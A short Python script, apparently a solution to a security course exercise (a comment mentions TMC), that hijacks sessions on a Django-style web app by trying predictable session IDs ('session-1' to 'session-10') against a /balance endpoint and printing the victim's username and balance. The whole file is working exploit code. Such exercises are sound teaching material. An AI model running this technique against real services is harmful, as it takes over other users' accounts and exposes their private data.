import sys
import requests
import json

def test_session(address):
    django_session = 'sessionid'
    session_guess_base = 'session-'
    hijacked_balance = 0
    test_req = requests.get(f'{address}/')
    token = test_req.cookies.get('csrftoken')

    for guess in range(1, 11):
        guessed_session = f'{session_guess_base}{guess}'
        cookies = {django_session: guessed_session}
        
        if token:
            cookies['csrftoken'] = token

        try:
            r = requests.get(f'{address}/balance', cookies=cookies)
            response_json = r.json()
            username = response_json.get('username', 'anonymous')

            hijacked_balance = response_json['balance']
            print(f'Guess {guess}: session={guessed_session}')
            print(f"Username: {response_json['username']}\n{'-'*40}")
            print(f"Balance: {hijacked_balance}\n{'-'*40}")

            if username != 'anonymous':
                print("Valid session found!")
                return hijacked_balance
        except Exception as e:
            print(f'Error: {e}')

    print("No valid session found.")
    return hijacked_balance


def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
